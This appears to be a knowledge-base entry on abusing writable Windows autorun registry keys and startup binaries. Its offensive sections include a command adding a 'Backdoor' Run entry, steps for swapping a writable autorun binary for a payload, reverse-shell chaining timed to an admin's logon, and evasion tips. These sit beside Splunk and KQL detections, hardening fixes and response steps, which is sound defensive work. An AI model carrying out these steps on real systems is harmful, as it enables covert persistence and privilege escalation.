examples.label: Enumerate startup programs and their locations
examples.command: Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

notes:
=== Startup Autorun Registry - Persistence and Privilege Abuse ===
Autorun keys execute commands on user logon - writable entries allow arbitrary code execution.

=== AUTORUN REGISTRY LOCATIONS ===
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run     (all users)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce (all users, once)
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run     (current user only)
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce (current user, once)
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run (32-bit on 64-bit)

=== ENUMERATION ===
  Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User
  reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
  reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

Automated:
  .\SharpUp.exe audit ModifiableRegistryAutoRuns
  Invoke-AllChecks (PowerUp)
  wmic startup list full

=== EXPLOITATION SCENARIOS ===
Scenario 1: Write access to registry key → add malicious entry
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Tools\shell.exe" /f
  → Executes as SYSTEM next time Windows starts (for HKLM entries)
  → Executes as current user for HKCU entries (less useful for privesc, useful for persistence)

Scenario 2: Write access to binary referenced in existing autorun entry
  If autorun points to C:\Tools\AppName.exe and C:\Tools\ is writable:
  Replace AppName.exe with malicious binary
  → Executes with same privileges as the account that triggers the autorun

=== PATIENCE-BASED TECHNIQUE ===
HKLM autoruns execute when ANY user logs on (including admins/SYSTEM for services).
Place malicious binary, wait for a privileged user to log on → get their privileges.
Useful in long-term assessments when other paths are exhausted.

=== CHAINING CONTEXT ===
Autorun write access → place reverse shell → catch SYSTEM or admin callback at next login
Persistence deployment → add reverse shell to HKCU Run after gaining initial foothold
IT admin logs on after hours → admin-context autorun fires → new high-privilege session
Combine with office hours scheduling: deploy on Friday, catch callback Monday morning

=== WHAT TO LOOK FOR ===
HKLM Run key writable by non-admin = privilege escalation
HKCU Run key writable (always owned by user) = persistence vector
Autorun binaries in writable directories = binary replacement opportunity
wmic startup shows all - filter for entries pointing to user-writable paths
name: Weak Permissions - Startup / Autorun Enumeration
command: Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
description: Lists autostart programs. A startup entry or its target binary that is writable by your user runs when a higher-privileged user logs in - replace it with a payload.

defense.why_it_works: Windows runs binaries listed in startup locations (registry Run keys, Startup folders, scheduled tasks, services) at user logon or system boot. If any startup binary or its containing directory is writable by the current user, replacing the binary plants code that executes in the startup context - often as another user who logs in next, or as SYSTEM for service-based autoruns.
defense.prerequisites: Shell access. Write access to a startup binary path or its directory. The target user (or SYSTEM) must log in or the system must reboot to trigger execution.
defense.impact: Persistent code execution as the startup context user (another user, SYSTEM, or domain admin if they log in to this system). Can provide privilege escalation on next system restart or user logon.
defense.detection: Get-CimInstance Win32_StartupCommand by standard user. Modification of startup binary by non-admin. Autoruns (Sysinternals) detecting unexpected entries. File integrity monitoring on startup executable paths.
defense.artifacts: Process log: Get-CimInstance Win32_StartupCommand queried by standard user | File: startup executable modified by non-admin | Registry: new Run key entry by non-admin
defense.splunk_spl:
index=wineventlog EventCode=4104 ScriptBlockText="*Win32_StartupCommand*"
| table _time, Computer, User, ScriptBlockText

index=sysmon EventCode=11 TargetFilename="*\\Start Menu\\Programs\\Startup\\*"
| table _time, Computer, Image, TargetFilename
defense.sentinel_kql:
DeviceEvents
| where ActionType == "PowerShellCommand" and ProcessCommandLine has "Win32_StartupCommand"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
| union (DeviceFileEvents | where FolderPath has "Start Menu\\Programs\\Startup" | project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine=FolderPath)
| sort by Timestamp desc
defense.prevention: Restrict write access to all startup binary directories. Audit startup entries with Autoruns regularly. Enable file integrity monitoring on startup paths. Monitor registry Run keys for changes.
defense.misconfiguration: Startup binary stored in C:\Tools or user-writable directory with standard users having write access. No file integrity monitoring on startup paths. No audit of startup registry keys.
defense.vulnerable_config:
# Enumerate startup programs:
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User
# Command: C:\Tools\check.bat <- check permissions

accesschk.exe -wvu 'C:\Tools\check.bat'
# BUILTIN\Users: FILE_ALL_ACCESS <- writable!

# Replace with malicious payload:
copy malicious.exe C:\Tools\check.bat
defense.secure_config:
# Audit startup program paths:
Get-CimInstance Win32_StartupCommand | ForEach-Object {
    $path = $_.Command -replace '"',''
    icacls $path 2>$null
}

# Fix writable startup locations:
icacls C:\Tools /inheritance:r /grant 'SYSTEM:(OI)(CI)F' /grant 'Administrators:(OI)(CI)F'

# Use Sysinternals Autoruns for comprehensive audit
defense.evasion: Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Sysmon, Windows Security Event Log for surrounding context (5 min before/after)
Check for new scheduled tasks, services, or registry autoruns on the affected host
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Lists autostart programs to find a writable one that runs at another user's logon:
  Get-CimInstance Win32_StartupCommand   enumerate autostart entries
  | select Name, command, Location, User | fl   show each entry's command, where it is registered, and which user it runs for
If an entry or its target binary is writable by you, replace it with a payload that executes when a higher-privileged user logs in.
